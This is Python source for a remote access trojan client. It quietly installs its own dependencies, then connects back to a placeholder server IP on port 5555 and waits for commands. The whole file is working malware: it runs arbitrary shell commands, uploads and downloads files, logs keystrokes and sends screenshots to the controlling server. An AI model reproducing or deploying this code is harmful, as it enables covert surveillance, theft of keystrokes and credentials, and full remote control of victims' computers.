import socket
import time
import subprocess
import json
import os
import threading
import sys

def install_dependencies():
    try:
        import pynput
        from PIL import ImageGrab
    except ImportError:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "pynput", "pillow"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL 
        )

install_dependencies()

from pynput import keyboard
from PIL import ImageGrab

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    global s
    while True:
        time.sleep(20) 
        try:
            s.connect(('<YOUR_SERVER_IP>', 5555))  # Replace with your server IP
            shell()
            s.close()
            break
        except Exception as e:
            print(f"Connection failed: {e}")
            s.close()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

keylog_data = []

def on_press(key):
    if len(keylog_data) < 1000:
        keylog_data.append(str(key))
    else:
        keylog_data.pop(0)
        keylog_data.append(str(key))

def start_keylogger():
    global keylogger_listener
    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()
    keylogger_listener.join()

def stop_keylogger():
    global keylogger_listener
    if keylogger_listener:
        keylogger_listener.stop()

def capture_screen():
    screen = ImageGrab.grab()
    screen.save("screenshot.png")
    with open("screenshot.png", "rb") as f:
        s.sendall(f.read())
    s.send(b"END_OF_SCREENSHOT")
    os.remove("screenshot.png")

def execute_command(command):
    execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    result = execute.stdout.read() + execute.stderr.read()
    return result.decode()

def download_file(file_name):
    with open(file_name, "rb") as f:
        s.sendall(f.read())
    s.send(b"END_OF_FILE")

def upload_file(file_name):
    with open(file_name, "wb") as f:
        while True:
            chunk = s.recv(1024)
            if chunk.endswith(b"END_OF_FILE"):
                f.write(chunk[:-11])
                break
            f.write(chunk)

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            stop_keylogger()
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command == 'keylog_start':
            keylog_thread = threading.Thread(target=start_keylogger)
            keylog_thread.daemon = True
            keylog_thread.start()
        elif command == 'keylog_dump':
            reliable_send("\n".join(keylog_data))
            keylog_data.clear()
        elif command == 'screenshot':
            capture_screen()
        else:
            result = execute_command(command)
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()